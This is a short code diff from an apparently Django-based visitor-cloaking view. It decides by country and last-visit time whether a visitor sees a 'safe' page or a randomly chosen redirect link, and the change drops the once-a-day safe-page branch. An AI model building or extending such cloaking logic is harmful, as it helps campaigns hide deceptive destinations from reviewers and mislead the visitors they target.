@@ -61,19 +61,20 @@ def unique_subid(request, subid):
         'subid': visitor.text,
         'redirect_link': random.choice(app_settings.REDIRECT_LINKS),
     }
+#
+#    if visitor.visit_datetime > day_ago:
+#        visitor.save()
+#        # One more visit, just showing safe page
+#        return render_to_response('%s/safe.html' % visitor.lp, context)
+#
+#    else:
 
-    if visitor.visit_datetime > day_ago:
-        visitor.save()
-        # One more visit, just showing safe page
-        return render_to_response('%s/safe.html' % visitor.lp, context)
+    # First hit in a day
+    if visitor.country_code in ('EG', 'NL'):  # Allow Egypt and Netherlands always
+        visitor.cloaked = False
+        visitor.reason = ''
 
-    else:
-        # First hit in a day
-        if visitor.country_code in ('EG', 'NL'):  # Allow Egypt and Netherlands always
-            visitor.cloaked = False
-            visitor.reason = ''
-
-        visitor.visit_datetime = datetime.datetime.now()  # Saving last access time
+    visitor.visit_datetime = datetime.datetime.now()  # Saving last access time
 
     visitor.ip = ip
     visitor.save()
